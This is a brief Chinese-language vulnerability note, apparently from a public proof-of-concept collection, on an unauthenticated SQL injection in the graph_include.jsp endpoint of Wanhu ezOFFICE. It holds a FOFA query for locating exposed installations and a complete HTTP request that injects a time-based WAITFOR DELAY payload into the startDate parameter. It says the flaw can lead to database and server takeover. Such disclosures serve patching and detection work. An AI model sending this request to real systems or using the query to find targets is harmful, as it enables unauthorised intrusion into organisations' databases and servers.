# 万户ezOFFICE系统graph_include.jsp存在SQL注入漏洞

万户 ezOFFICE /defaultroot/platform/report/graphreport/graph_include.jsp接口处存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。

## fofa

```yaml
app="万户ezOFFICE协同管理平台"
```

## poc

```yaml
GET /defaultroot/platform/report/graphreport/graph_include.jsp?id=2&startDate=2022-01-01%2000:00:00.000%27%20as%20datetime)%20group%20by%20t.emp_id,t.empname%20)%20%20s%20group%20by%20empname%20order%20by%20num%20desc%20%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Connection: close
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408091910016.png)